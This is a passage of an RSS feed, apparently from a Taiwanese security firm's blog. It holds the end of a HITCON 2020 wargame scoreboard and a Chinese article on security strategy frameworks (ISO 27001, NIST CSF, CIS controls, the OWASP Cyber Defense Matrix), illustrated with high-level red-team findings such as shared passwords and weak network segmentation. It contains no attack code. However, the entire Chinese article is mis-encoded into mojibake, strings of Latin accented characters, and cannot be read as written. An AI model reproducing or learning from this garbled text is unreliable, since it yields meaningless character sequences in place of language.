      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;ankleboy&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;hans00&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;Meow&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;ginoah&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;cjiso1117&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;zodiuss&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10&lt;/td&gt;
      &lt;td&gt;dalun&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
                <link>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/</link>
                <guid>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020</guid>
                <pubDate>Fri, 30 Oct 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä½ çš„è³‡å®‰ç­–ç•¥å¤ æ˜ç¢ºå—ï¼Ÿé€éæ¡†æ¶å„ªå…ˆç·©è§£çœŸå¯¦å¨è„…</title>
                <description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;é€™ä¸€ç¯‡æ˜¯è·Ÿ Allen åœ¨ iThome 2020 è³‡å®‰å¤§æœƒä¸€èµ·åˆ†äº«çš„ä¸»é¡Œã€‚åœ¨åœ‹å…§ï¼Œå¤§å®¶æ¯”è¼ƒå°‘è¨è«–è³‡å®‰ç­–ç•¥é€™å€‹è­°é¡Œã€‚ä¸»è¦åŸå› é™¤äº†é€™å€‹é¡Œç›®å¤ªéè‰±æ¾€ã€ç„¡èŠå¤–ï¼Œå¾å•†æ¥­çš„è§’åº¦ä¹Ÿä¸å®¹æ˜“æˆç‚ºç²åˆ©çš„æœå‹™ã€‚è€Œæˆ‘å€‘æœƒæƒ³åˆ†äº«é€™å€‹ä¸»é¡Œçš„åŸå› èˆ‡æˆ‘å€‘ä¸»è¦çš„æœå‹™ã€Œç´…éšŠæ¼”ç·´ã€æœ‰é—œã€‚&lt;/p&gt;

&lt;p&gt;åŸ·è¡Œç´…éšŠæ¼”ç·´ä¸‰å¹´å¤šä¾†ï¼Œé›–ç„¶å”åŠ©ä¼æ¥­æ‰¾å‡ºå¨è„…ç‡Ÿé‹çš„é‡è¦å…¥ä¾µè·¯å¾‘ï¼Œç”šè‡³ç™¼ç¾é˜²ç¦¦æ©Ÿåˆ¶çš„ä¸è¶³ä¹‹è™•ï¼Œè¨±å¤šç©æ¥µçš„å®¢æˆ¶æ›´æƒ³çŸ¥é“é™¤äº†ç•¶æ¬¡ç´…éšŠæ¼”ç·´ç™¼ç¾çš„å•é¡Œå¤–ï¼Œæ˜¯ä¸æ˜¯æœ‰æ›´å‘¨å»¶çš„æ–¹å¼ä¾†ç›¤é»é˜²ç¦¦ç¾æ³çš„ä¸è¶³ã€‚å› æ­¤ï¼Œæˆ‘å€‘é–‹å§‹å°‹æ‰¾ä¸€å€‹çµæ§‹åŒ–ä¸”å®Œæ•´çš„æ–¹å¼ä¾†æ¢ç©¶é€™å€‹è­°é¡Œï¼Œé–‹å§‹æ€è€ƒåœ‹éš›æ¨™æº–ã€æ¡†æ¶èˆ‡ç´…éšŠæ¼”ç·´ä¹‹é–“çš„é—œä¿‚ã€‚å¸Œæœ›é™¤äº†å¾æ”»æ“Šè€…çš„æ€ç¶­è·ŸæŠ€å·§æ‰¾åˆ°ä¼æ¥­çš„å•é¡Œå¤–ï¼Œä¹Ÿèƒ½å¾é˜²å®ˆæ–¹çš„è§’åº¦æ€è€ƒä¼æ¥­é•·æœŸè€Œå…¨é¢çš„é˜²ç¦¦è¦åŠƒã€‚&lt;/p&gt;

&lt;h2 id=&quot;è¤‡é›œçš„å•é¡Œæ›´è¦å¾ç­–ç•¥é¢æ€è€ƒ&quot;&gt;è¤‡é›œçš„å•é¡Œï¼Œæ›´è¦å¾ç­–ç•¥é¢æ€è€ƒ&lt;/h2&gt;

&lt;p&gt;è³‡å®‰æ˜¯éå¸¸è¤‡é›œè€Œä¸”åˆ†å·¥ç´°è†©çš„å·¥ä½œï¼Œä¸ç¢ºå®šå•é¡Œçš„æ ¸å¿ƒå°±ç„¡æ³•é‡æ¸…æ¬Šè²¬ã€å®‰æ’è³‡æºï¼Œé‘è«–é™ä½å†ç™¼çš„æ©Ÿç‡ã€‚å› æ­¤è¦è§£æ±ºé€™å€‹è¤‡é›œå•é¡Œéœ€è¦æœ‰è³‡å®‰ç­–ç•¥ä¾†æ”¯æ’ï¼Œè€Œä¸æ˜¯é ­ç—›é†«é ­ã€è…³ç—›é†«è…³ã€‚é¦–å…ˆï¼Œæˆ‘å€‘æŠŠè³‡å®‰çš„é˜²è­·åˆ†ç‚ºä¸‰ç¨®éšæ®µï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ¢å¾©åŸç‹€å‹ï¼šä¼æ¥­å°‡ä¸»è¦çš„è³‡å®‰è³‡æºæŠ•æ”¾åœ¨æ—¥å¸¸çš„ç¶­é‹åŠå•é¡ŒæŸ¥æ‰¾ä¸Šï¼ŒåŒ…æ‹¬ç¢ºèªç•¶ä¸‹ç™¼ç”Ÿçš„å•é¡Œã€é€²è¡Œç·Šæ€¥è™•ç†ã€ç½å®³æ§åˆ¶ã€æŸ¥æ˜åŠåˆ†æç™¼ç”ŸåŸå› ã€ä¿®å¾©å•é¡Œã€ç ”ç©¶å°ç­–é¿å…å†ç™¼ç”Ÿç­‰ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;é˜²å¾®æœæ¼¸å‹ï¼šå°‡è³‡æºæŠ•å…¥åœ¨å°ä¼æ¥­é€ æˆé‡å¤§è¡æ“Šçš„å•é¡Œä¸Šï¼Œä¸¦æŒçºŒé€²è¡Œé é˜²åŠå›æ‡‰çš„è©•ä¼°èˆ‡æ¼”ç·´ã€å˜—è©¦æå‰æ‰¾å‡ºåŸå› ï¼ŒåŠ ä»¥é é˜²æˆ–æ€è€ƒæ¼”ç·´ç™¼ç”Ÿæ™‚æ‡‰è©²åŸ·è¡Œçš„å°ç­–ã€‚&lt;/li&gt;
  &lt;li&gt;è¿½æ±‚ç†æƒ³/å“è¶Šå‹ï¼šç›¤é»åŠåˆ†æå•é¡Œçš„å„ªã€ç¼ºé»ï¼Œè¨­å®šä¼æ¥­æŒçºŒç²¾é€²çš„ç›®æ¨™ï¼Œè—‰ç”±è¡Œå‹•è¨ˆç•«ä¾†é”æˆç›®æ¨™ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ ¹æ“šæˆ‘å€‘çš„è§€å¯Ÿï¼Œå¹¾ä¹å¤šæ•¸çš„ä¼æ¥­éƒ½æ˜¯è½åœ¨ã€Œæ¢å¾©åŸç‹€å‹ã€ï¼Œä½†ä¼æ¥­å¤šåŠèªçŸ¥å…¶ç‚ºã€Œé˜²å¾®æœæ¼¸å‹ã€ã€‚é€ æˆé€™å€‹èªçŸ¥ä¸Šçš„è½å·®ï¼Œä¸»å› ä¾†è‡ªæ–¼å°è‡ªèº«å®‰å…¨ç‹€æ³çš„ä¸äº†è§£ï¼Œå°è‡´å°æ–¼é¢¨éšªçš„æŒæ¡ç¨‹åº¦ç”¢ç”Ÿèª¤åˆ¤ã€‚å› æ­¤ï¼Œé€éä¸€å€‹å®è§€çš„ç­–ç•¥æ€è€ƒï¼Œæœ‰åŠ©æ–¼ç›¤é»å„ç¨®æ§åˆ¶æªæ–½ä¸è¶³ä¹‹è™•ï¼Œæ‰æœ‰æ©Ÿæœƒå°‡é˜²ç¦¦ç¸±æ·±çš„æ©Ÿåˆ¶æ‹´ç·Šèºçµ²ï¼Œæ‰“é€ æœŸæœ›çš„é˜²ç¦¦é«”ç³»ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;åˆ†å±¤è² è²¬å„å¸å…¶è·&quot;&gt;åˆ†å±¤è² è²¬ï¼Œå„å¸å…¶è·&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘å»ºè­°å°‡ç¸±æ·±é˜²ç¦¦ä»¥ä¸€å€‹æ›´å…¨é¢çš„æ–¹å¼ä¾†æª¢è¦–ï¼Œåˆ†ç‚º Executive Layerã€Process Layerã€Procedure Layer ä»¥åŠ Technology Layer å››å±¤ï¼Œä¸€å€‹å¥½çš„é˜²ç¦¦ç­–ç•¥ï¼Œé™¤äº†è¦åšåˆ° R &amp;amp; R (Role &amp;amp; Responsibility) å¤–ï¼Œæ›´é‡è¦çš„æ˜¯åœ¨ä¸Šè€Œä¸‹åˆ¶å®šç­–ç•¥ä¹‹å¾Œï¼Œç¶“ç”±ä¸‹è€Œä¸Šçš„æ–¹å¼ç¢ºä¿ç­–ç•¥çš„æœ‰æ•ˆæ€§ï¼Œå› æ­¤ä¸åŒéšå±¤çš„è³‡å®‰å¾æ¥­äººå“¡éƒ½æœ‰å…¶éœ€è¦é—œæ³¨çš„é‡é»ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Executive Layerï¼šè³‡å®‰é•· (CISO) çš„è¦–è§’ï¼Œé—œæ³¨è¶³ä»¥å½±éŸ¿çµ„ç¹”ç‡Ÿé‹çš„é¢¨éšªåŠç·©è§£é€™äº›é¢¨éšªçš„è³‡æºæ˜¯å¦å……è¶³ã€‚å¯ä»¥åƒè€ƒçš„æ¨™æº–åŒ…æ‹¬ NIST 800-39ã€NIST 800-30ã€ISO 27005 ä»¥åŠ CIS RAMã€‚&lt;/li&gt;
  &lt;li&gt;Process Layerï¼šé«˜éšä¸»ç®¡çš„è¦–è§’ï¼Œé—œæ³¨æŒçºŒç¶­æŒçµ„ç¹”å®‰å…¨é‹ä½œçš„ç®¡ç†ç¨‹åºæ˜¯å¦è¶³å¤ åŠè½å¯¦ã€è¦åŠƒæœªä¾†çµ„ç¹”è³‡å®‰çš„æˆç†Ÿåº¦ç­‰ã€‚åƒè€ƒçš„æ¨™æº–åŒ…æ‹¬ NIST Cybersecurity Frameworkã€ISO 27001 ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;Procedure Layerï¼šä¸­éšä¸»ç®¡çš„è¦–è§’ï¼ŒåŒ…æ‹¬æ±ºå®šå“ªäº›å®‰å…¨æ§åˆ¶æªæ–½è¦åŸ·è¡Œã€åŸ·è¡Œçš„ç´°ç·»ç¨‹åº¦ï¼Œé€™äº›é …ç›®å°±æ˜¯ä¸€èˆ¬æ‰€è¬‚çš„å®‰å…¨æ§åˆ¶æªæ–½ (security control)ï¼Œä¾‹å¦‚çµ„æ…‹è¨­å®šã€å¯†ç¢¼ç®¡ç†ã€æ—¥èªŒç´€éŒ„çš„é¡å‹ç­‰ï¼Œå¯ä»¥åƒè€ƒ NIST 800-53 æˆ–æ˜¯ CIS Critical Security Controls ç­‰è¦ç¯„ã€‚&lt;/li&gt;
  &lt;li&gt;Technology Layerï¼šåˆéšä¸»ç®¡èˆ‡æŠ€è¡“äººå“¡çš„è§’åº¦ï¼ŒåŒ…å«é‡å°æ”»æ“Šè€…çš„æŠ€å·§æ‰€æ‡‰å°çš„è³‡å®‰è¨­å‚™ã€è‡ªå‹•åŒ–å®‰å…¨æ§åˆ¶æªæ–½çš„å·¥å…·ã€ç›£æ§åˆ†æå·¥å…·ç­‰ç­‰ã€‚ç›®å‰é€™éƒ¨ä»½ä¹Ÿæ˜¯çµ„ç¹”è³‡å®‰é˜²ç¦¦çš„é‡é»ï¼Œå¯ä»¥åƒè€ƒè³‡å®‰è¨­å‚™æ”¯æ´ MITRE ATT&amp;amp;CK çš„æ”»æ“ŠæŠ€å·§ä¾†ç›¤é»ç¾æœ‰çš„é˜²ç¦¦ç¼ºå£æˆ–é€é OWASP Cyber Defense Matrix (CDM) å®šä½ç”¢å“ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;æ¡†æ¶èˆ‡æ¨™æº–çš„å®šä½&quot;&gt;æ¡†æ¶èˆ‡æ¨™æº–çš„å®šä½&lt;/h2&gt;

&lt;p&gt;åœ¨èªªæ˜å®Œä¸åŒéšå±¤é—œæ³¨çš„é‡é»å¾Œï¼Œé€™è£¡ç‰¹åˆ¥èªªæ˜å¹¾å€‹é‡è¦ (æˆ–ä½¿ç”¨ç‡è¼ƒé«˜) çš„æ¨™æº–åŠæ¡†æ¶ã€‚é™¤äº†è¦çŸ¥é“å“ªäº›æ¡†æ¶è·Ÿæ¨™æº–èˆ‡è³‡å®‰æœ‰é—œå¤–ï¼ŒåŒæ™‚ä¹Ÿéœ€è¦äº†è§£é©ç”¨çš„æƒ…å¢ƒã€ç›®çš„åŠå½¼æ­¤é–“çš„å·®ç•°&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ISO 27001ï¼šå±¬æ–¼ Process Layerï¼Œå…¶æä¾›å»ºç«‹è³‡è¨Šå®‰å…¨ç®¡ç†ç³»çµ±çš„æ¨™æº–ï¼Œå¹«åŠ©çµ„ç¹”ç®¡ç†å’Œä¿è­·è³‡è¨Šè³‡ç”¢ï¼Œç¢ºä¿é”åˆ°å®¢æˆ¶æˆ–åˆ©å®³é—œä¿‚äººå…¶å®‰å…¨çš„æœŸå¾…ï¼›å¯ä»¥å–å¾—é©—è­‰ã€‚ä½†è¦æé†’çš„æ˜¯ï¼Œ27001 ä½œç‚ºä¸€å€‹å¯¦è¸è³‡è¨Šå®‰å…¨ç®¡ç† (Information Security System) çš„æ¨™æº–ï¼Œé›–ç„¶å…·æœ‰æ–‡ä»¶åŒ– (Documented) è¦æ±‚çš„å„ªé»ï¼Œä½†å…¶è¦æ±‚é …ç›®å¤šæ•¸åœ¨é é˜² (Prevent) åŠé¿å… (Avoid) ä¸Šï¼Œè¼ƒå°‘è‘—é‡åœ¨å› æ‡‰ç¶²è·¯å®‰å…¨çš„åµæ¸¬ (Detect) åŠå›æ‡‰ (React) ä¸Šã€‚&lt;/li&gt;
  &lt;li&gt;NIST Cybersecurity Framework (CSF)ï¼šå±¬æ–¼ Process Viewï¼Œç”±ç¾åœ‹ä¸»å°çš„ç¶²è·¯å®‰å…¨æ¡†æ¶ï¼Œæä¾›é—œéµåŸºç¤è¨­æ–½æˆ–ä¸€èˆ¬ä¼æ¥­å¹«åŠ©çµ„ç¹”ç®¡ç†å’Œä¿è­·è³‡è¨Šè³‡ç”¢ï¼Œç¢ºä¿å…¶å®‰å…¨ç„¡æ…®ï¼›å¯ä»¥é©—è­‰ä¸¦æœ‰æˆç†Ÿåº¦æ¨¡å¼ï¼Œå¯ä»¥è®“ä¼æ¥­å…ˆæç¹ªè‡ªå·±çš„è³‡å®‰ç‹€æ…‹ (profile) ä¸¦è—‰ç”±è¨‚å®šç›®æ¨™é€å¹´å¼·åŒ–ä¼æ¥­çš„å®‰å…¨ã€‚åŒæ™‚ï¼Œæ˜ç¢ºçš„å°‡å®‰å…¨è¦æ±‚çµæ§‹åŒ–çš„åˆ†æˆè­˜åˆ¥ (Identify)ã€é˜²ç¦¦ (Protect)ã€åµæ¸¬ (Detect)ã€å›æ‡‰ (Respond) åŠå¾©åŸ (Recover)ï¼Œä¸¦æ”¯æ´å…¶ä»–å®‰å…¨æ¨™æº–èˆ‡æ¡†æ¶çš„å°æ‡‰ï¼Œå¦‚ CIS CSCã€COBITã€27001ã€NIST 800-53 ç­‰ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CIS Cybersecurity Controlï¼šè³‡è¨Šå®‰å…¨æ§åˆ¶æŒ‡å¼•å±¬æ–¼ Procedure Viewï¼Œé‡å°ç¶²è·¯æ”»æ“Šæ‰€æ‡‰æ¡å–çš„æ§åˆ¶é …ç›®æå‡ºå„ªå…ˆåŸ·è¡Œé †åºï¼Œçµ„ç¹”å¯ä¾ç…§è‡ªèº«çš„è¦æ¨¡ (IG1-IG3) åŸ·è¡Œå°æ‡‰çš„æªæ–½ï¼Œ åˆ†ç‚ºåŸºç¤å‹ã€åŸºæœ¬å‹åŠçµ„ç¹”å‹ï¼Œå…± 20 å€‹æ§åˆ¶ç¾¤çµ„ã€178 å€‹å­æ§åˆ¶é …ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ä¸è‰¯çš„è³‡å®‰é˜²è­·ç‹€æ…‹&quot;&gt;ä¸è‰¯çš„è³‡å®‰é˜²è­·ç‹€æ…‹&lt;/h2&gt;

&lt;p&gt;å¯¦å‹™ä¸Šä¾†èªªï¼Œä¼æ¥­çš„é˜²ç¦¦ç­–ç•¥æœ‰å…©ç¨®ä¸è‰¯çš„ç‹€æ…‹&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¸±æ·±é˜²è­·ä¸è¶³ï¼šé˜²ç¦¦æ©Ÿåˆ¶ä¸å¤ å…¨é¢ (ç´…è‰²ç¼ºå£)ã€è¨­å‚™æ•ˆæœä¸å¦‚å®£ç¨± (è—è‰²ç¼ºå£)ã€è¨­å‚™æœ¬èº«çš„é™åˆ¶ (æ©˜è‰²ç¼ºå£)ï¼›ä¸Šè¿°çš„å•é¡Œï¼Œç¶œåˆè€Œè¨€ï¼Œå°±æœƒä½¿å¾—è¨­å‚™é–“çš„ç¶œæ•ˆç„¡æ³•é˜»æ–·æ”»æ“Šéˆï¼Œå½¢æˆæŠ€è¡“å±¤çš„ç ´å£ã€‚
&lt;img src=&quot;/assets/img/blog/20201013/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;é…å¥—æªæ–½çš„ä¸å®Œæ•´ï¼šä¹Ÿå°±æ˜¯ã€Œç¨‹åºã€åŠã€Œæµç¨‹ã€ä¸Šçš„ä¸è¶³ï¼Œå‡è¨­æŸè³‡å®‰è¨­å‚™å¯ä»¥åµæ¸¬åˆ°ç•°å¸¸è¡Œç‚ºï¼Œè³‡å®‰äººå“¡å¦‚ä½•åˆ†è¾¨é€™æ˜¯æ”»æ“Šè¡Œç‚ºé‚„æ˜¯å“¡å·¥å…§éƒ¨æ­£å¸¸è¡Œç‚ºï¼Ÿå¤šä¹…å…§è¦åŠæ™‚å›æ‡‰é€²è¡Œè™•ç†ã€å¤šä¹…è¦ç™¼å‹•é‘‘è­˜ï¼Ÿä¸€æ—¦ä¸Šè¿°çš„ã€Œç¨‹åºã€åŠã€Œæµç¨‹ã€æ²’æœ‰å®šç¾©æ¸…æ¥šï¼Œç¸±ä½¿è¨­å‚™æœ¬èº«æ˜¯æœ‰æ•ˆçš„ï¼Œçµ„ç¹”ä»ç„¶æœƒå› ç‚ºå›æ‡‰æ™‚é–“éæ…¢ï¼Œå°è‡´æ”»æ“Šè€…å…¥ä¾µæˆåŠŸã€‚
&lt;img src=&quot;/assets/img/blog/20201013/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;ç›¤é»å„å±¤æ¬¡çš„å®ˆå‚™ç¯„åœ&quot;&gt;ç›¤é»å„å±¤æ¬¡çš„å®ˆå‚™ç¯„åœ&lt;/h2&gt;

&lt;p&gt;é‚£éº¼è¦å¦‚ä½•æ”¹å–„é€™å…©ç¨®ä¸ä½³çš„é˜²ç¦¦ç‹€æ…‹ï¼Ÿæˆ‘å€‘å¯ä»¥å–®ç¨ä½¿ç”¨ CDM ä¾†è©•ä¼°æŠ€è¡“å±¤çš„å®ˆå‚™ç¯„åœæ˜¯å¦è¶³å¤ ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒä¾†ä½œç‚ºç¨‹åºã€æµç¨‹åŠæŠ€è¡“å±¤çš„è·¨éšå±¤çš„ç›¤é»ï¼›&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CDM (Cyber Defense Matrix) æ˜¯ OWASP çš„ä¸€å€‹å°ˆæ¡ˆï¼Œç”±ä¸€å€‹ 5x5 çš„çŸ©é™£æ‰€æ§‹æˆã€‚æ©«è»¸æ˜¯ NIST CSF çš„äº”å¤§é¡åˆ¥ï¼Œè€Œç¸±è»¸å‰‡æ˜¯è³‡ç”¢ç›¤é»å¸¸è¦‹çš„åˆ†é¡ï¼›çµ„ç¹”å¯ä»¥åˆ©ç”¨é€™å€‹çŸ©é™£ä¾†ç›¤é»ä¼æ¥­ Technology View å»ºæ§‹çš„é˜²ç¦¦è¨­å‚™ï¼Œæ›´ç²¾æº–çš„ç¢ºèªéœ€è¦ä¿è­·çš„è³‡ç”¢æ˜¯å¦åœ¨ NIST CSF çš„æ¯å€‹é¡åˆ¥éƒ½æœ‰å°æ‡‰çš„æªæ–½ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä»¥ ISO 27001 ä½œç‚ºä¾‹å­ï¼Œå°‡å…¶æœ¬æ–‡çš„è¦æ±‚åŠé™„éŒ„ A çš„æ§åˆ¶æªæ–½ï¼Œå°æ‡‰åˆ° CDM ä¸Šï¼Œé€²è€Œç›¤é» ISO 27001 åœ¨çµ„ç¹”çš„ç¨‹åºé¢æ‰€èƒ½æ¶µè“‹çš„ç¯„åœã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œä¸åŒçµ„ç¹”åœ¨ç›¤é»æ™‚ï¼Œæœƒç”¢ç”Ÿä¸åŒçš„å°æ‡‰çµæœï¼Œé€™æ­£æ˜¯é€é CDM ä¾†æª¢è¦–çš„æ„ç¾©æ‰€åœ¨ï¼›ä¾‹å¦‚åœ¨ç›¤é»ã€ŒA.7.2.2 è³‡è¨Šå®‰å…¨èªçŸ¥ã€æ•™è‚²åŠè¨“ç·´ã€æ™‚ï¼Œä¼æ¥­è¦æ€è€ƒå°æ–¼äººå“¡çš„æ•™è‚²è¨“ç·´æ˜¯å¦æ¶µè“‹åˆ° NIST CSF çš„äº”å¤§é¡åˆ¥ï¼Œé‚„æ˜¯åªåŒ…å«äººå“¡æ„è­˜çš„è¨“ç·´ï¼›å¦å¤–ä»¥ã€ŒA.6.2.2 é è·å·¥ä½œã€çš„é˜²è­·æ©Ÿåˆ¶ï¼Œé™¤äº†é‡å°ç¶²è·¯å±¤åŠæ‡‰ç”¨ç¨‹å¼ä¿è­·å¤–ï¼Œç®¡ç†ç¨‹åºæ˜¯å¦ä¹ŸåŒ…å«é è·å·¥ä½œçš„è³‡æ–™åŠè¨­å‚™è¦æ±‚ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—ï¼Œå¾€ä¸‹ä¸€å±¤ (Procedure Layer)ï¼Œä¹Ÿå°‡ä¼æ¥­ç¾æœ‰çš„æ§åˆ¶æªæ–½ï¼Œå°æ‡‰åˆ° CDM ä¸­ã€‚é€™é‚Šä»¥ CIS CSC ç‚ºä¾‹ï¼Œæ·ºè—è‰²çš„éƒ¨ä»½å±¬æ–¼åŸºæœ¬å‹çš„æ§åˆ¶ç¾¤çµ„ã€ç°è‰²éƒ¨åˆ†ç‚ºåŸºç¤å‹æ§åˆ¶ç¾¤çµ„ï¼Œçµ„ç¹”å‹çš„æ§åˆ¶ç¾¤çµ„å› ç‚ºæ¯”è¼ƒåå‘ç¨‹åºé¢ï¼Œå› æ­¤æ¯”è¼ƒé›£å–®ç¨æ­¸å±¬åœ¨ç‰¹å®šçš„ CDM å€å¡Šä¸­ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;é€éçœŸå¯¦çš„å¨è„…è£œè¶³è³‡å®‰ç­–ç•¥çš„ä¸è¶³&quot;&gt;é€éçœŸå¯¦çš„å¨è„…ï¼Œè£œè¶³è³‡å®‰ç­–ç•¥çš„ä¸è¶³&lt;/h2&gt;

&lt;p&gt;åœ¨é€é CDM ç›¤é»å®Œ Procedure Layer åŠ Process Layer å¾Œï¼Œä¼æ¥­æ¥è‘—å¯ä»¥é€éè³‡å®‰äº‹æ•…ã€å¨è„…æƒ…è³‡ã€ç´…éšŠæ¼”ç·´æˆ–æ¨¡æ“¬å…¥ä¾µæ”»æ“Šå·¥å…· (BAS) ç­‰è²¼è¿‘çœŸå¯¦å¨è„…çš„æœå‹™æˆ–å·¥å…·ï¼Œä¾†æ€è€ƒè³‡å®‰ç­–ç•¥çš„ä¸è¶³ä¹‹è™•ã€‚é€™é‚Šæˆ‘å€‘ä»¥ä¸€å€‹ç´…éšŠæ¼”ç·´çš„éƒ¨åˆ†æˆæœä½œç‚ºæ¡ˆä¾‹ï¼Œä¾†è²«ç©¿æœ¬ç¯‡æ–‡ç« çš„æ‡‰ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€™å€‹æ¡ˆä¾‹ä¸­ï¼Œæˆ‘å€‘ç´„ç•¥å¯ä»¥ç™¼ç¾å¹¾å€‹å•é¡Œï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¨‹å¼æ’°å¯«ä¸å¤ å®‰å…¨ï¼šä»¥è‡´å­˜åœ¨ä»»æ„æª”æ¡ˆä¸Šå‚³çš„æ¼æ´ã€‚&lt;/li&gt;
  &lt;li&gt;ä¸åŒç³»çµ±é–“ä½¿ç”¨å…±ç”¨å¸³è™Ÿå¯†ç¢¼ï¼šå°è‡´æ’åº«æ”»æ“Šå¯ä»¥æˆåŠŸï¼Œè€Œç›£æ§æ©Ÿåˆ¶æˆ–çµ„æ…‹ç®¡ç†é¡¯ç„¶æœªç™¼æ®ä½œç”¨ã€‚&lt;/li&gt;
  &lt;li&gt;æœªä¾ç…§è³‡æ–™æ©Ÿæ•æ€§é€²è¡Œç¶²æ®µå€éš”ï¼šå°å¤–æœå‹™ç¶²æ®µå¯ä»¥é€é RDP é€£ç·šè‡³ core zoneã€‚&lt;/li&gt;
  &lt;li&gt;ç‰¹æ¬Šå¸³è™Ÿèˆ‡å­˜å–æ§åˆ¶æœªé€²è¡Œé—œè¯åˆ†æï¼šè‡´å¯ä»¥ä½¿ç”¨ backup å¸³è™Ÿç™»å…¥ AD ç¶²åŸŸæ§åˆ¶å™¨ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¸Šè¿°çš„ 4 å€‹é …ç›®ï¼Œæ˜¯ç›´è¦ºåœ¨ç›¤é»æ™‚å¯èƒ½æƒ³åˆ°çš„ç–æ¼é …ç›®ã€‚ä½†è¦æ€éº¼ç¢ºèªé‚„æœ‰å…¶ä»–æ ¹å›  (root cause) æ˜¯ä¼æ¥­æ²’æ€è€ƒåˆ°çš„å‘¢ï¼Ÿé€™æ™‚å€™å°±å¯ä»¥åˆ©ç”¨å·²çŸ¥çš„æ¨™æº–åŠæ¡†æ¶ï¼Œæ­é…å…ˆå‰ç›¤é»å¥½çš„æ§åˆ¶é …ç›®ï¼Œä¾†æ›´ç‚ºå‘¨å»¶çš„æ€è€ƒç›®å‰é‚„å¯ä»¥å¼·åŒ–çš„æ§åˆ¶æªæ–½ï¼›å¦‚æœä¼æ¥­çš„è³‡æºæœ‰é™ï¼Œç”šè‡³å¯ä»¥åƒè€ƒ CIS CSC å°æ–¼å„ªå…ˆæ¬Šçš„å»ºè­°é †åºï¼Œå…ˆç¢ºèªçµ„ç¹”å¯¦ä½œç¾¤çµ„ (Implementation Group) ï¼Œå†ä¾åŸºæœ¬å‹ã€åŸºç¤å‹åŠçµ„ç¹”å‹ï¼Œè¨‚å®šçŸ­ã€ä¸­ã€é•·æœŸè¨ˆç•«åŠæŠ•æ”¾è³‡æºï¼Œæœ‰ç›®æ¨™çš„æ”¹å–„é˜²ç¦¦èƒ½è€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

